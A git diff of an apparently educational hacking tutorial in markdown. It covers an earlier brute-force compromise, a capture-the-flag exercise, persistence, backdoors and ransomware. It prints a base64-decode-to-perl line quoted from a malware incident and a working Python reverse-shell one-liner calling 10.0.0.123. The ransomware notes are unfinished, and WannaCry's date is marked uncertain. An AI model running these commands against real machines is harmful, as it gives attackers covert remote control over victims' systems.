@@ -385,7 +385,64 @@ the malware made an attempt to "obfuscate" itself - it contained a ```base64``` 
 ```bash
 echo "dfedsioanasip433tu849jgisoupanf89qw" | base64 --decode | perl
 ```
-the decoded perl script attempted to connect via https to a server in the Netherlands to get lists of host machines to attack and credentials to attack with.
+the decoded perl script attempted to connect via https to a command and control server in the Netherlands to get lists of host machines to attack and credentials to attack with.
 
 ## today's challenge! capture the flag (CTF)
-some summy has some important info!!
+### target: Prof. Charles McDumson
+McDumson aka Dummy is our target, he has an account on our server and in there there are some secret military codes that we want to steal! 
+
+In this exercise we'll be using a few things that you'll need t ofind out about for yourself:
+- ```su```
+- ```base64```
+- ```.hidden files```
+
+have fun!
+
+# Part 5 (hacking part 2)
+
+in this session we'll look at some common attacks so we can better understand the threats we face. in the last session we saw one way attackers can gain access to our machine - via brute force. once an attacker has access to a machine  they will need to do 2 things:
+
+1. establish persistent access to the machine
+2. deliver the payload - the attack itself
+
+note that this tutorial is for education only! don't attack anyone without permission! 
+
+## persistent access
+to ensure that they can continue to access the compromised machine, the attacker will need a way in that's robust to changing passwords. in the case of the attack on my machine, the attacker changed the password of the compromised account. that's one way of doing it, but will be discovered when the legitimate user of the compromised account tries to log in again. 
+
+another way to gain persistent access to a machine is to create a backdoor - a hidden entry point to the machine. backdoors should be hard to detect, and a hard to detect back door is a **reverse shell**. 
+
+### reverse shells
+a shell is a program that lets users send commands to the machine, like the terminal for example. in this series of sessions we've learnt about ```ssh``` - the secure shell - remote access to a command line. this is a forward shell, where the host machine runs an ```ssh``` daemon (a program that runs in the background) which allows incoming connections to the machine from users. in forward shells, the connection is initiated by the user. conversely a reverse shell connection is initiated by the host. the significance of this is that the shell connection can bypass a firewall that protects the host machine from incoming connections. 
+
+reverse shells come in different forms and tend to be very simple, which can make them hard to identify in system monitors like ```htop```. let's look at a simple way to make a reverse shell in python!
+
+```python
+$ python -c 'import socket,subprocess,os;\
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
+s.connect(("10.0.0.123",1111));\
+os.dup2(s.fileno(),0);\
+os.dup2(s.fileno(),1);\
+os.dup2(s.fileno(),2);\
+p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+
+
+## backdoors and ransomware
+as attackers, we can do more than just steal information. we can ensure our persistent access to our victims' machine by creating a backdoor - a secret access portal to the victims' machine. This way, if our victim changes their password we'll still have a way in. 
+persistent access will allow us to:
+- monitor the victim
+- steal more data
+- attack the user even more
+- use the victims machine to attack other machines
+## backdoors
+## ransomware
+ransomware attacks encrypt a victim's data, who will be prompted to pay a ransom to have the the data decrypted. these attacks can devestate companies and organisations, who can be unable to operate during the atttack. generally it's advised not to pay the attackers, since there is no way to garuntee that the files will be decrypted after the payment is made. the payment will also fund the next attack on another company. 
+### wannacry
+wannacry is a famous ransomware worm that spread around the world in ### 2015??### crippling companies and organisations  - including the NHS.
+- eternal blue - nsa / shadow brokers
+- spread, nhs
+- deactivation
+### maersk -  petya / notpetya
+### eurofins
